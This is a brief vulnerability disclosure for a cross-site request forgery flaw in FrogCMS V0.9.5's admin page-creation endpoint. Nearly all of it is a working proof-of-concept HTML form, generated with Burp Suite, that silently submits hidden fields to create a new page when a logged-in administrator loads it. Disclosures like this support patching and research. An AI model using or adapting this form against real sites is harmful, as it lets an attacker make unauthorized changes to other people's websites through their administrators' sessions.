
target:https://github.com/philippe/FrogCMS
version: V0.9.5

FrogCMS V0.9.5 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/?/page/add

POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/?/page/add" method="POST">
      <input type="hidden" name="/page/add" value="" />
<input type="hidden" name="page%5Bparent_id%5D" value="1" />
<input type="hidden" name="page%5Btitle%5D" value="cs1" />
<input type="hidden" name="page%5Bslug%5D" value="cs1" />
<input type="hidden" name="page%5Bbreadcrumb%5D" value="cs1" />
<input type="hidden" name="page%5Bkeywords%5D" value="" />
<input type="hidden" name="page%5Bdescription%5D" value="" />
<input type="hidden" name="page_tag%5Btags%5D" value="" />
<input type="hidden" name="part%5B0%5D%5Bname%5D" value="body" />
<input type="hidden" name="part%5B0%5D%5Bfilter_id%5D" value="" />
<input type="hidden" name="part%5B0%5D%5Bcontent%5D" value="" />
<input type="hidden" name="part%5B1%5D%5Bname%5D" value="sidebar" />
<input type="hidden" name="part%5B1%5D%5Bfilter_id%5D" value="" />
<input type="hidden" name="part%5B1%5D%5Bcontent%5D" value="" />
<input type="hidden" name="page%5Blayout_id%5D" value="" />
<input type="hidden" name="page%5Bbehavior_id%5D" value="" />
<input type="hidden" name="page%5Bstatus_id%5D" value="1" />
<input type="hidden" name="page%5Bneeds_login%5D" value="2" />
<input type="hidden" name="commit" value="Save+and+Close" />

      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

